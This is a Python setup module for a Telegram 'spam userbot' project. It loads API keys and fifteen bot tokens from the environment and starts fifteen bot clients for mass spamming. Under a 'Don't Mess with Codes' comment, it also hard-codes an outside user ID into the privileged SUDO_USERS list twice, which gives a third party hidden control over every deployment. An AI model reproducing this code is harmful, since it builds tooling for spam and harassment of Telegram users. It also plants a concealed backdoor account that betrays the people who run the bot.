# saurabhspam - Spam Userbots
# Copyright © 2021 @tera_baap_katil

import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

saurabhversion = "v2.0.3"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
BOT_TOKEN11 = config("BOT_TOKEN11", default=None)
BOT_TOKEN12 = config("BOT_TOKEN12", default=None)
BOT_TOKEN13 = config("BOT_TOKEN13", default=None)
BOT_TOKEN14 = config("BOT_TOKEN14", default=None)
BOT_TOKEN15 = config("BOT_TOKEN15", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5052908678 not in SUDO_USERS:
    SUDO_USERS.append(5052908678)

OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5052908678)

# Tokens

saurabh = TelegramClient('saurabh', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

saurabh2 = TelegramClient('saurabh2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

saurabh3 = TelegramClient('saurabh3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

saurabh4 = TelegramClient('saurabh4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

saurabh5 = TelegramClient('saurabh5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

saurabh6 = TelegramClient('saurabh6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

saurabh7 = TelegramClient('saurabh7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

saurabh8 = TelegramClient('saurabh8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

saurabh9 = TelegramClient('saurabh9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

saurabh10 = TelegramClient('saurabh10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

saurabh11 = TelegramClient('saurabh11', API_ID, API_HASH).start(bot_token=BOT_TOKEN11)

saurabh12 = TelegramClient('saurabh12', API_ID, API_HASH).start(bot_token=BOT_TOKEN12)

saurabh13 = TelegramClient('saurabh13', API_ID, API_HASH).start(bot_token=BOT_TOKEN13)

saurabh14 = TelegramClient('saurabh14', API_ID, API_HASH).start(bot_token=BOT_TOKEN14)

saurabh15 = TelegramClient('saurabh15', API_ID, API_HASH).start(bot_token=BOT_TOKEN15)
